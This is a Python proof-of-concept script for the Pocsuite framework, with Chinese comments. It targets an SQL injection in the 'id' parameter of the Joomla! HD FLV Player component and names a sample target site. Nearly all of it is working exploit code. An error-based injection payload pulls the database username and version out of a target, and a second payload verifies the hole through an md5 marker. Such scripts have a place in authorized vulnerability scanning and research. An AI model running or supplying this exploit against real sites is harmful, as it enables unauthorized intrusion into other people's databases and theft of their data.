#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '86873'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2010-04-13'
    createDate = '2016-01-27'
    updateDate = '2016-01-27'
    references = ['http://www.seebug.org/vuldb/ssvid-86873']
    name = 'HD FLV Player Component for Joomla! &#39;id&#39; Parameter SQL Injection Vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'HD FLV Player Component for Joomla!'
    appVersion = 'N/A'
    vulType = 'SQL Injection'
    desc = '''
        Joomla!是一款开放源码的内容管理系统(CMS)。
        Joomla!的组件HD FLV Player (com_hdflvplayer)存在SQL注入漏洞。
        远程攻击者可以利用脚本index.php的id执行任意的SQL指令。
    '''
    samples = ['http://zeweldfc.com']

    def _attack(self):
        #利用floor回显报错的方式，读取数据库信息
        result = {}
        payload=("1 AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT"
            "(0x247e7e7e24,user(),0x2a2a2a,version(),0x247e7e7e24,"
            "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) -- -")
        exploit="/index.php?option=com_hdflvplayer&id="
        #提取信息的正则表达式
        pars="\$~~~\$([_a-zA-Z0-9].*)\*\*\*(.*)\$~~~\$"
        #构造访问地址
        vulurl=self.url+exploit+payload
        #自定义的HTTP
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #尝试访问
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查
        if 'Duplicate entry' in resp.content:
            #尝试提取信息
            match=re.search(pars,resp.content,re.I|re.M)
            if match:
                #记录数据库信息
                result['DatabaseInfo']={}
                #数据库用户名
                result['DatabaseInfo']['Username']=match.group(1)
                #数据库版本
                result['DatabaseInfo']['Version']=match.group(2)
        return self.parse_output(result)

    def _verify(self):
        #利用注入漏洞计算md5(3.1415)
        result = {}
        #利用的payload(利用的是floor回显报错的方式)
        payload=("1 AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT"
            "(md5(3.1415),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA"
            ".CHARACTER_SETS GROUP BY x)a) -- -")
        #漏洞页面
        exploit='/index.php?option=com_hdflvplayer&id='
        #构造访问地址
        vulurl=self.url+exploit+payload
        #自定义的HTTP
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #尝试访问
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串(md5(3.1415)=63e1f04640e83605c1d177544a5a0488)
        if '63e1f04640e83605c1d177544a5a0488' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)